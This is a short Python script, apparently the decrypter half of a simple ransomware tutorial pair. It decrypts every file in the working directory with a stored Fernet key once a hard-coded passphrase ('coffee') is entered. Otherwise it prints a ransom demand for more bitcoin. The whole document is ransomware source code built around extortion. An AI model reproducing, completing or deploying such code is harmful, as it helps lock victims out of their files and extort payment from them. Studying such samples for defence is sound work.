import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == 'encrypter.py' or file == 'thekey.key' or file == 'decrypter.py':
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key","rb") as key:
    secretKey = key.read()

    secretphrase = "coffee"
    user_phrase = input("Enter the secret key phrase to decrypt your files\n")

if user_phrase == secretphrase:
    for file in files:
        with open(file,"rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretKey).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_decrypted)
    print("congrats, you're files are decrypted. enjoy your coffee")
else:
    print("Sorry, wrong secret phrase. Send me more bitcoin")